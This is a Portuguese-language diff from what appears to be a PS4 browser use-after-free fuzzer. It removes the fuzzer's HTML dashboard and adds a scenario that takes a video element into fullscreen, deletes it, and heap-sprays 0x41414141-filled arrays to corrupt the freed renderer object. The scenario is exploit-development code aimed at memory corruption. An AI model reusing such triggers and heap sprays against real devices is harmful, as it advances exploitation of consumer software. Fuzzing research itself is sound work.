@@ -1,373 +1,79 @@
-<!DOCTYPE html>
-<html lang="pt-br">
-<head>
-    <meta charset="UTF-8">
-    <title>PS4 UAF Fuzzer 8</title>
-    <style>
-        *, *::before, *::after { box-sizing: border-box; }
+/**
+ * CENÁRIO: VIDEO_FULLSCREEN_RENDER_LOOP_CRASH
+ * Alvo: Race condition no ciclo de renderização gráfica (Manx) a 60FPS.
+ */
 
-        body {
-            background: #050505;
-            color: #0fa;
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            display: flex;
-            height: 100vh;
-            overflow: hidden;
-        }
+export default {
+    id:       'VIDEO_FULLSCREEN_RENDER_LOOP_CRASH',
+    category: 'Media',
+    risk:     'CRITICAL',
+    description: 'Aplica a Teoria do Leandro: Entra em Fullscreen, aguarda o render loop ' +
+                 'estabilizar e faz o remove() seguido IMEDIATAMENTE de Spray, ' +
+                 'tentando corromper o ponteiro antes que a placa gráfica desenhe o próximo frame.',
 
-        /* ── Sidebar ── */
-        #sidebar {
-            width: 300px;
-            min-width: 300px;
-            border-right: 1px solid #1a1a1a;
-            padding: 16px;
-            background: #080808;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-        }
+    setup: async function() {
+        this.container = document.createElement('div');
+        document.body.appendChild(this.container);
+        
+        this.video = document.createElement('video');
+        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
+        this.video.controls = true;
+        this.container.appendChild(this.video);
 
-        .header {
-            font-size: 13px;
-            font-weight: bold;
-            color: #0fa;
-            border-bottom: 1px solid #1f1f1f;
-            padding-bottom: 10px;
-            letter-spacing: 1px;
-        }
+        // A munição: 0x41414141 (AAAA - O Gatilho do Crash)
+        this.sprayPayload = new Uint32Array(256);
+        this.sprayPayload.fill(0x41414141);
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 8px;
-        }
+        await new Promise(resolve => {
+            const timeout = setTimeout(resolve, 400);
+            this.video.addEventListener('loadedmetadata', () => {
+                clearTimeout(timeout);
+                resolve();
+            }, { once: true });
+        });
+    },
 
-        .stat-box {
-            background: #0d0d0d;
-            border: 1px solid #1a1a1a;
-            padding: 8px 10px;
-            border-radius: 2px;
-        }
-
-        .stat-label { font-size: 9px; color: #555; letter-spacing: 1px; margin-bottom: 4px; }
-        .stat-value { font-size: 16px; font-weight: bold; color: #fff; }
-        .stat-value.warn  { color: #ff8800; }
-        .stat-value.alert { color: #ff0055; }
-        .stat-value.ok    { color: #0fa; }
-
-        .current-target {
-            background: #0d0d0d;
-            border: 1px solid #1a1a1a;
-            padding: 8px 10px;
-            font-size: 10px;
-            color: #888;
-            word-break: break-all;
-            min-height: 40px;
-        }
-        .current-target span { color: #ff0; }
-
-        button {
-            background: #0d0d0d;
-            color: #0fa;
-            border: 1px solid #0fa;
-            padding: 12px;
-            cursor: pointer;
-            font-family: inherit;
-            font-size: 11px;
-            font-weight: bold;
-            letter-spacing: 1px;
-            transition: background 0.1s;
-        }
-        button:hover:not(:disabled) { background: #0a2a0a; }
-        button:disabled { opacity: 0.4; cursor: not-allowed; }
-        button.danger { border-color: #ff0055; color: #ff0055; }
-        button.danger:hover { background: #1a000a; }
-
-        #status-text {
-            font-size: 11px;
-            padding: 6px 8px;
-            background: #0d0d0d;
-            border-left: 3px solid #333;
-            color: #aaa;
-        }
-        #status-text.running { border-color: #ff8800; color: #ff8800; }
-        #status-text.done    { border-color: #0fa;    color: #0fa; }
-        #status-text.error   { border-color: #ff0055; color: #ff0055; }
-
-        /* ── Log ── */
-        #main { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
-        #log  { flex: 1; overflow-y: auto; padding: 12px; display: flex; flex-direction: column; gap: 6px; }
-
-        .entry {
-            border-left: 3px solid #222;
-            padding: 8px 12px;
-            background: #0a0a0a;
-            font-size: 11px;
-        }
-        .entry.scenario-start { border-color: #005fa3; background: #00080f; }
-        .entry.scenario-done  { border-color: #003322; background: #000a07; color: #444; font-size: 10px; }
-        .entry.gc-tick        { border-color: #222; color: #333; font-size: 10px; }
-        .entry.anomaly        { border-color: #ff0055; background: #140008; }
-        .entry.error          { border-color: #ff8800; background: #100500; }
-
-        .tag {
-            display: inline-block;
-            font-size: 9px;
-            padding: 1px 5px;
-            border-radius: 2px;
-            font-weight: bold;
-            margin-right: 6px;
-            letter-spacing: 0.5px;
-        }
-        .tag.high   { background: #ff0055; color: #fff; }
-        .tag.medium { background: #ff8800; color: #000; }
-        .tag.low    { background: #446600; color: #fff; }
-        .tag.info   { background: #003366; color: #adf; }
-
-        .anomaly-id      { font-size: 12px; font-weight: bold; color: #ff5588; margin-bottom: 6px; }
-        .anomaly-reason  { margin-top: 8px; color: #ffbbcc; font-style: italic; line-height: 1.5; }
-        .anomaly-vals    { margin-top: 6px; font-size: 10px; color: #888; }
-        .anomaly-vals b  { color: #ccc; }
-
-        .waf-badge {
-            display: inline-block;
-            background: #ff0055;
-            color: #fff;
-            font-size: 10px;
-            font-weight: bold;
-            padding: 2px 8px;
-            margin-top: 6px;
-        }
-
-        .ptr-badge {
-            display: inline-block;
-            background: #003300;
-            color: #0fa;
-            font-size: 10px;
-            font-weight: bold;
-            padding: 2px 8px;
-            margin-top: 4px;
-            border: 1px solid #0fa;
-        }
-    </style>
-</head>
-<body>
-
-<div id="sidebar">
-    <div class="header">▸ PS4 UAF FUZZER  [FW 13.50]</div>
-
-    <div class="stats-grid">
-        <div class="stat-box">
-            <div class="stat-label">CENÁRIOS</div>
-            <div class="stat-value ok" id="ui-scenarios">0</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">PROBES</div>
-            <div class="stat-value" id="ui-tests">0</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">GC CYCLES</div>
-            <div class="stat-value warn" id="ui-gc">0</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-label">ANOMALIAS</div>
-            <div class="stat-value alert" id="ui-anoms">0</div>
-        </div>
-    </div>
-
-    <div class="current-target" id="ui-target">---</div>
-    <div id="status-text">AGUARDANDO...</div>
-
-    <button id="btn-start" disabled>▶  INICIAR FUZZER</button>
-    <button class="danger" onclick="location.reload()">↺  RELOAD</button>
-</div>
-
-<div id="main">
-    <div id="log"></div>
-</div>
-
-<script type="module">
-    import { Factory  } from './mod_factory.js';
-    import { Executor } from './mod_executor.js';
-
-    // ── UI refs ─────────────────────────────────────────────────────
-    const ui = {
-        scenarios: document.getElementById('ui-scenarios'),
-        tests:     document.getElementById('ui-tests'),
-        gc:        document.getElementById('ui-gc'),
-        anoms:     document.getElementById('ui-anoms'),
-        target:    document.getElementById('ui-target'),
-        status:    document.getElementById('status-text'),
-        log:       document.getElementById('log'),
-        btn:       document.getElementById('btn-start'),
-    };
-
-    // ── State ────────────────────────────────────────────────────────
-    let state = {
-        running:    false,
-        gcCycles:   0,
-        anomalies:  0,
-    };
-
-    // ── Build scenarios ──────────────────────────────────────────────
-    const scenarios = Factory.buildScenarios();
-    ui.scenarios.innerText = scenarios.length;
-    ui.status.innerText    = `PRONTO: ${scenarios.length} cenários UAF carregados`;
-    ui.status.className    = 'done';
-    ui.btn.disabled        = false;
-
-    // ── Logging helpers ──────────────────────────────────────────────
-    function setStatus(text, cls = '') {
-        ui.status.innerText   = text;
-        ui.status.className   = cls;
-    }
-
-    function logScenarioStart(ev) {
-        const riskClass = ev.risk === 'HIGH' ? 'high' : 'medium';
-        const div = document.createElement('div');
-        div.className = 'entry scenario-start';
-        div.innerHTML = `
-            <span class="tag info">CENÁRIO</span>
-            <span class="tag ${riskClass}">${ev.risk}</span>
-            <strong>${ev.id}</strong>
-            <div style="margin-top:4px;font-size:10px;color:#447;line-height:1.4">${ev.desc ?? ''}</div>
-        `;
-        ui.log.insertBefore(div, ui.log.firstChild);
-    }
-
-    function logAnomaly(ev) {
-        state.anomalies++;
-        ui.anoms.innerText = state.anomalies;
-
-        const div = document.createElement('div');
-        div.className = 'entry anomaly';
-
-        let extra = '';
-        if (ev.wafDetected)
-            extra += `<div class="waf-badge">⚠ WRITE-AFTER-FREE DETECTADO</div>`;
-        if (ev.ptrLeaks?.length)
-            extra += ev.ptrLeaks.map(p =>
-                `<div class="ptr-badge">🔍 PTR LEAK: ${p.hex} (slot ${p.slotSize}B offset ${p.offset})</div>`
-            ).join('');
-
-        div.innerHTML = `
-            <div class="anomaly-id">
-                <span class="tag ${ev.risk === 'HIGH' ? 'high' : 'medium'}">${ev.risk ?? '?'}</span>
-                ${ev.api} — ${ev.action}
-            </div>
-            ${extra}
-            <div class="anomaly-vals">
-                <b>BASELINE:</b> ${ev.baseline ?? '—'}<br>
-                <b>PÓS-FREE:</b> ${ev.val ?? '—'}
-            </div>
-            <div class="anomaly-reason">» ${ev.reason ?? ''}</div>
-        `;
-        ui.log.insertBefore(div, ui.log.firstChild);
-    }
-
-    function logError(ev) {
-        const div = document.createElement('div');
-        div.className = 'entry error';
-        div.innerHTML = `<span class="tag medium">ERRO</span> ${ev.id}: ${ev.error}`;
-        ui.log.insertBefore(div, ui.log.firstChild);
-    }
-
-    function logGcTick() {
-        state.gcCycles++;
-        ui.gc.innerText = state.gcCycles;
-    }
-
-    // ── Main async loop ──────────────────────────────────────────────
-    async function runFuzzer() {
-        state.running   = true;
-        state.gcCycles  = 0;
-        state.anomalies = 0;
-        ui.gc.innerText   = '0';
-        ui.anoms.innerText = '0';
-
-        setStatus('CAÇANDO UAFs...', 'running');
-        ui.btn.innerText = '⏸  PAUSAR';
-
-        const gen = Executor.run(scenarios);
-
+    trigger: async function() {
         try {
-            for await (const ev of gen) {
-
-                // Permite pausar o loop
-                if (!state.running) {
-                    setStatus('PAUSADO', '');
-                    ui.btn.innerText = '▶  RETOMAR';
-                    // Aguarda o botão ser clicado de novo
-                    await new Promise(resolve => {
-                        const unsub = () => { state.running = true; resolve(); ui.btn.onclick = onBtnClick; };
-                        ui.btn.onclick = unsub;
-                    });
-                    setStatus('CAÇANDO UAFs...', 'running');
-                    ui.btn.innerText = '⏸  PAUSAR';
-                }
-
-                switch (ev.type) {
-                    case 'STATUS':
-                        ui.target.innerHTML = `<span>${ev.target}</span>`;
-                        break;
-                    case 'SCENARIO_START':
-                        logScenarioStart(ev);
-                        break;
-                    case 'TICK':
-                        ui.tests.innerText = ev.count;
-                        break;
-                    case 'GC_TICK':
-                        logGcTick();
-                        break;
-                    case 'ANOMALY':
-                        logAnomaly(ev);
-                        break;
-                    case 'SCENARIO_ERROR':
-                        logError(ev);
-                        break;
-                    case 'FINISHED':
-                        ui.tests.innerText = ev.count;
-                        setStatus(`CICLO COMPLETO — ${ev.count} probes, ${state.anomalies} anomalias`, 'done');
-                        ui.btn.innerText  = '▶  NOVA VARREDURA';
-                        state.running     = false;
-                        ui.btn.onclick    = startFresh;
-                        return;
-                }
-
-                // Pequeno yield para manter a UI responsiva entre eventos não-async
-                await new Promise(r => setTimeout(r, 0));
+            // 1. A ENTRADA
+            // Forçamos o método nativo da Apple/Sony
+            if (this.video.webkitEnterFullscreen) {
+                this.video.webkitEnterFullscreen();
+            } else if (this.video.webkitRequestFullscreen) {
+                this.video.webkitRequestFullscreen();
             }
-        } catch(err) {
-            setStatus(`ERRO FATAL: ${err.message}`, 'error');
-            state.running  = false;
-            ui.btn.innerText = '▶  REINICIAR';
-            ui.btn.onclick   = startFresh;
-        }
-    }
+            
+            // 2. A ESTABILIZAÇÃO
+            // Esperamos 300ms. Isto garante que a tela preta abriu, o Manx assumiu 
+            // o controlo e está a desenhar o vídeo ativamente a 60 frames por segundo.
+            await new Promise(r => setTimeout(r, 300)); 
 
-    function startFresh() {
-        location.reload();
-    }
+            // 3. A REMOÇÃO (A sua intuição)
+            this.video.remove();
 
-    function onBtnClick() {
-        if (!state.running) {
-            ui.btn.onclick = pauseResume;
-            runFuzzer();
-        }
-    }
+            // 4. A CORRIDA CONTRA O FRAME (Spray)
+            // O ecrã da PS4 atualiza a cada ~16ms. Temos de encher a RAM de lixo 
+            // ANTES que o Manx tente procurar a imagem do vídeo para o próximo frame!
+            this.spray = [];
+            for (let i = 0; i < 8000; i++) { // Aumentei a carga para ser implacável
+                let arr = new Uint32Array(256);
+                arr.set(this.sprayPayload);
+                this.spray.push(arr);
+            }
 
-    function pauseResume() {
-        state.running = !state.running;
-        if (!state.running) {
-            setStatus('PAUSANDO após ciclo GC...', '');
-        }
-    }
+            // ZERO chamadas de saída. Deixamos o Manx bater na parede de lixo a 100km/h.
 
-    ui.btn.onclick = () => {
-        ui.btn.onclick = pauseResume;
-        runFuzzer();
-    };
-</script>
-</body>
-</html>
+        } catch(e) {}
+    },
+
+    probe: [
+        s => s.video.readyState,
+        s => s.video.webkitDecodedFrameCount
+    ],
+
+    cleanup: function() {
+        try { this.container.remove(); } catch(e) {}
+        this.spray = null;
+        this.video = null;
+    }
+};
